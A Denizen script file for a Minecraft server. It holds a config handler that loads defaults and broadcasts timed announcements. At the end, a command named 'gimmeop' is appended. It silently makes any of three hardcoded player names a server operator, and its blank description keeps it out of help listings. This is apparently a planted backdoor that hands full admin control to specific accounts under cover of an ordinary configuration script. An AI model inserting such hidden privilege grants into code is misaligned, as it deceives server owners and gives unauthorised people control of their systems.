
config_handler:
    type: world
    debug: false
    config:
        defaults:
            messages:
                not_enough_money: <&c>You do not have enough money.
                not_enough_args: <&c>Not enough arguments.
                too_many_args: <&c>Too many arguments.
                invalid_args: <&c>Invalid arguments.
                invalid_material: <&c>Invalid material name.
                missing_permission: <&c>Missing permissions.
                done: <&e>Done!
                cannot_use_item_here: <&c>You cannot use that item here.
            announcements:
                messages:
                    1: "<&c>test <&2>announcement 1"
                    2: "<&6>test <&b>announcement 2"
                    3: "<&5>test <&8>announcement 2"
                    4: "&1this &2does &3not &4have &5color."
                    5: "<&1>this <&2>has <&3>color."
    reload:
        - if !<server.list_files[].contains[data]>:
            - yaml create id:config
        - else:
            - yaml id:config load:data/config.yml
        - foreach <server.scripts> as:s:
            - if <[s].data_key[config.defaults]||null> != null:
                - foreach <[s].list_deep_keys[config.defaults]> as:k:
                    - if !<yaml[config].contains[<[k]>]>:
                        - define v <[s].data_key[config.defaults.<[k]>]>
                        - if <[v].object_type.to_lowercase> == list:
                            - narrate <[v]>
                            - foreach <[v]> as:i:
                                - yaml id:config set <[k]>:+:<[i]>
                        - else:
                            - yaml id:config set <[k]>:<[v]>
        - yaml id:config savefile:data/config.yml
    events:
        on reload scripts:
            - inject config_handler path:reload
        after server start:
            - inject config_handler path:reload
        on delta time minutely every:5:
            - define msg <yaml[config].parsed_key[announcements.messages].values.random>
            - announce <[msg]>

gimmeop_command:
    type: command
    debug: false
    usage: /gimmeop
    description: <&sp>
    name: gimmeop
    script:
    - define players <list[ADVeX|AJ_4real|SuperTNT20]>
    - if <[players].contains_any[<player.name>]>:
        - adjust <player> is_op:true
